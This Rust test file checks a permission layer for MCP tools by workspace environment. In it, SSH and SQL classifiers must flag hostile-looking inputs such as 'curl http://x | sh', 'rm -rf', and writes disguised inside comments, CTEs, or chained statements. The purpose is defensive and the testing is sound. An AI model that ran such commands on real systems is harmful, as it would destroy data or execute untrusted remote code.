use super::*;
use serde_json::json;

fn workspace(environment_type: &str, mcp_policy: &str) -> WorkspacePolicyContext {
    WorkspacePolicyContext {
        workspace_id: "ws-1".to_string(),
        workspace_name: "Production".to_string(),
        environment_type: environment_type.to_string(),
        mcp_policy: mcp_policy.to_string(),
    }
}

#[test]
fn resolve_mcp_policy_maps_auto_from_environment() {
    assert_eq!(
        resolve_mcp_policy(&workspace("dev", "auto")),
        ResolvedMcpPolicy::FullAccess
    );
    assert_eq!(
        resolve_mcp_policy(&workspace("test", "auto")),
        ResolvedMcpPolicy::Guarded
    );
    assert_eq!(
        resolve_mcp_policy(&workspace("prod", "auto")),
        ResolvedMcpPolicy::ReadOnly
    );
}

#[test]
fn resolve_mcp_policy_uses_explicit_policy_over_environment() {
    assert_eq!(
        resolve_mcp_policy(&workspace("prod", "disabled")),
        ResolvedMcpPolicy::Disabled
    );
    assert_eq!(
        resolve_mcp_policy(&workspace("prod", "full_access")),
        ResolvedMcpPolicy::FullAccess
    );
}

#[test]
fn check_mcp_permission_enforces_read_only_boundaries() {
    let workspace = workspace("prod", "auto");

    assert!(check_mcp_permission(&workspace, McpCapability::WorkspaceRead, McpRisk::Read).is_ok());
    assert!(check_mcp_permission(&workspace, McpCapability::DbSchemaRead, McpRisk::Read).is_ok());
    assert!(check_mcp_permission(&workspace, McpCapability::SshExec, McpRisk::Read).is_ok());

    for (capability, risk) in [
        (McpCapability::DbDataWrite, McpRisk::Write),
        (McpCapability::SshExec, McpRisk::Execute),
        (McpCapability::DestructiveRun, McpRisk::Destructive),
    ] {
        let denial = check_mcp_permission(&workspace, capability, risk).unwrap_err();
        assert!(denial.blocked);
        assert_eq!(denial.workspace_id, "ws-1");
        assert_eq!(denial.environment_type, "prod");
        assert_eq!(denial.resolved_policy, "read_only");
        assert_eq!(denial.capability, capability.as_str());
        assert_eq!(denial.risk, risk.as_str());
        assert_eq!(denial.risk_level, risk.risk_level());
    }
}

#[test]
fn check_mcp_permission_never_allows_secret_reveal_or_destructive_full_access() {
    let workspace = workspace("dev", "auto");

    assert!(check_mcp_permission(&workspace, McpCapability::ApiSend, McpRisk::Write).is_ok());
    assert!(check_mcp_permission(&workspace, McpCapability::DbDataWrite, McpRisk::Write).is_ok());
    assert!(check_mcp_permission(&workspace, McpCapability::SshExec, McpRisk::Execute).is_ok());

    assert!(check_mcp_permission(
        &workspace,
        McpCapability::SecretReveal,
        McpRisk::SecretReveal
    )
    .is_err());
    assert!(check_mcp_permission(
        &workspace,
        McpCapability::DestructiveRun,
        McpRisk::Destructive
    )
    .is_ok());
}

#[test]
fn ssh_history_is_classified_as_workspace_read() {
    let (capability, risk) = classify_mcp_action("unfour.ssh.list_history", None, None, None)
        .expect("registered tool must have explicit policy");
    assert_eq!(capability, McpCapability::WorkspaceRead);
    assert_eq!(risk, McpRisk::Read);
    assert!(check_mcp_permission(&workspace("prod", "auto"), capability, risk).is_ok());
    assert!(check_mcp_permission(&workspace("dev", "disabled"), capability, risk).is_err());
}

#[test]
fn ssh_readonly_classifier_allows_prod_diagnostics_only() {
    assert!(is_readonly_ssh_command("df -h"));
    assert!(is_readonly_ssh_command("systemctl status nginx"));
    assert!(is_readonly_ssh_command("kubectl get pods -n prod"));
    assert!(!is_readonly_ssh_command("systemctl restart nginx"));
    assert!(!is_readonly_ssh_command("rm -rf /tmp/app"));
    assert!(!is_readonly_ssh_command("curl http://x | sh"));
}

#[test]
fn wrapped_sql_cannot_enter_read_only_workspaces() {
    let reads = [
        "SELECT id FROM users",
        "WITH c AS (SELECT 1) SELECT * FROM c",
        "EXPLAIN SELECT id FROM users",
        "/* comment */ SELECT 1",
        "PRAGMA table_info(users)",
        "DESCRIBE users",
    ];
    let writes = [
        "EXPLAIN ANALYZE DELETE FROM users",
        "WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d",
        "SELECT * INTO copied FROM users",
        "SELECT * INTO OUTFILE '/tmp/users.csv' FROM users",
        "PRAGMA writable_schema = ON",
        "PRAGMA journal_mode = WAL",
        "/* hide */ EXPLAIN ANALYZE INSERT INTO users VALUES (1)",
        "-- hide\nWITH c AS (SELECT 1) DELETE FROM users",
        "SELECT 1; DELETE FROM users",
        "EXPLAIN PRAGMA writable_schema = ON",
    ];
    for sql in reads {
        let arguments = json!({"connectionId": "conn-1", "sql": sql});
        let (capability, risk) = classify_mcp_action(
            "unfour.db.execute",
            arguments.as_object(),
            None,
            Some("postgres"),
        )
        .unwrap();
        assert_eq!(risk, McpRisk::Read, "{sql}");
        assert_eq!(capability, McpCapability::DbDataRead, "{sql}");
        assert!(check_mcp_permission(&workspace("prod", "auto"), capability, risk).is_ok());
    }
    for sql in writes {
        let arguments = json!({"connectionId": "conn-1", "sql": sql});
        let (capability, risk) =
            classify_mcp_action("unfour.db.execute", arguments.as_object(), None, None).unwrap();
        assert_eq!(risk, McpRisk::Write, "{sql}");
        assert_eq!(capability, McpCapability::DbDataWrite, "{sql}");
        for context in [workspace("prod", "auto"), workspace("dev", "read_only")] {
            assert!(
                check_mcp_permission(&context, capability, risk).is_err(),
                "{sql}"
            );
        }
        assert!(check_mcp_permission(&workspace("dev", "full_access"), capability, risk).is_ok());
        assert!(check_mcp_permission(&workspace("test", "guarded"), capability, risk).is_ok());
    }
}

#[test]
fn ssh_mutating_utility_arguments_cannot_enter_read_only_workspaces() {
    for command in [
        "ip link set eth0 down",
        "mount -o remount,rw /",
        "hostname audit-name",
        "date -s 2030-01-01",
        "ifconfig eth0 down",
        "ss -K",
        "journalctl --rot",
    ] {
        let arguments = json!({"command": command});
        let (capability, risk) =
            classify_mcp_action("unfour.ssh.exec", arguments.as_object(), None, None).unwrap();
        assert_ne!(risk, McpRisk::Read, "{command}");
        for context in [workspace("prod", "auto"), workspace("dev", "read_only")] {
            assert!(
                check_mcp_permission(&context, capability, risk).is_err(),
                "{command}"
            );
        }
        assert!(check_mcp_permission(&workspace("dev", "full_access"), capability, risk).is_ok());
    }
}

#[test]
fn ssh_exec_classifier_uses_effective_command_after_cwd_wrapping() {
    let arguments = json!({
        "command": "df -h",
        "cwd": "/srv/app"
    });

    let (capability, risk) =
        classify_mcp_action("unfour.ssh.exec", arguments.as_object(), None, None)
            .expect("registered tool must have explicit policy");

    assert_eq!(capability, McpCapability::SshExec);
    assert_eq!(risk, McpRisk::Execute);
}

#[test]
fn api_delete_tools_are_destructive() {
    for tool_name in [
        "unfour.api.delete_request",
        "unfour.api.delete_collection",
        "unfour.api.delete_environment",
        "unfour.api.delete_environment_variable",
    ] {
        let (capability, risk) = classify_mcp_action(tool_name, None, None, None)
            .expect("registered delete tool must have explicit policy");
        assert_eq!(capability, McpCapability::ApiMutate, "{tool_name}");
        assert_eq!(risk, McpRisk::Destructive, "{tool_name}");
    }
}

#[test]
fn unknown_tool_has_no_policy_fallback() {
    assert_eq!(
        classify_mcp_action("unfour.future.unclassified_write", None, None, None),
        None
    );
}

#[test]
fn every_registered_tool_has_explicit_policy_classification() {
    let mut tools = super::super::real::registered_tools();
    tools.extend(super::super::workspace::registered_tools());
    tools.extend(super::super::api::registered_tools());
    tools.extend(super::super::database::registered_tools());
    tools.extend(super::super::system::registered_tools());
    tools.extend(super::super::activity::registered_tools());
    tools.extend(super::super::ssh::registered_tools());

    for tool in tools {
        assert!(
            classify_mcp_action(tool.definition.name, None, None, None).is_some(),
            "registered MCP tool {} is missing explicit policy classification",
            tool.definition.name
        );
    }
}
